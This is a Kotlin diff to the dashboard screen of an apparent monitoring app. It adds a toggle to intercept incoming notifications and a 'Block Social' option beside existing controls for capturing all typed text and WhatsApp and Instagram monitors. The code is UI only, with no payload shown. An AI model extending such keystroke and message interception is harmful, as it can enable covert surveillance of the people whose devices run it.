@@ -341,7 +341,7 @@ fun DashboardScreen(
                     subtitle = "Capture all typed text",
                     checked = dashboardState.keyEventsEnabled,
                     enabled = isServiceRunning,
-                    showDivider = false,
+                    showDivider = true,
                     onCheckedChange = { onEvent(DashboardEvent.ToggleKeyEvents(it)) }
                 )
                 AnimatedVisibility(visible = dashboardState.keyEventsEnabled) {
@@ -350,6 +350,27 @@ fun DashboardScreen(
                         currentValue = dashboardState.keyEventsIntervalMin,
                         onValueChange = { onEvent(DashboardEvent.UpdateKeyEventsInterval(it)) }
                     )
+                }
+                TactileToggleRow(
+                    label = "Notification Events",
+                    subtitle = "Intercept incoming notifications",
+                    checked = dashboardState.notificationEventsEnabled,
+                    enabled = isServiceRunning,
+                    showDivider = false,
+                    onCheckedChange = { onEvent(DashboardEvent.ToggleNotificationEvents(it)) }
+                )
+                val isAnySocialMonitorEnabled = dashboardState.whatsappUpdatesEnabled || dashboardState.whatsappBusinessUpdatesEnabled || dashboardState.instagramUpdatesEnabled
+                AnimatedVisibility(visible = dashboardState.notificationEventsEnabled && isAnySocialMonitorEnabled) {
+                    Box(modifier = Modifier.padding(start = 16.dp, end = 16.dp, bottom = 12.dp).clip(RoundedCornerShape(12.dp)).background(InnerCardSurface)) {
+                        TactileToggleRow(
+                            label = "Block Social",
+                            subtitle = "Ignore if social monitors are active",
+                            checked = dashboardState.notificationBlockSocialEnabled,
+                            enabled = isServiceRunning,
+                            showDivider = false,
+                            onCheckedChange = { onEvent(DashboardEvent.ToggleNotificationBlockSocial(it)) }
+                        )
+                    }
                 }
             }
         }
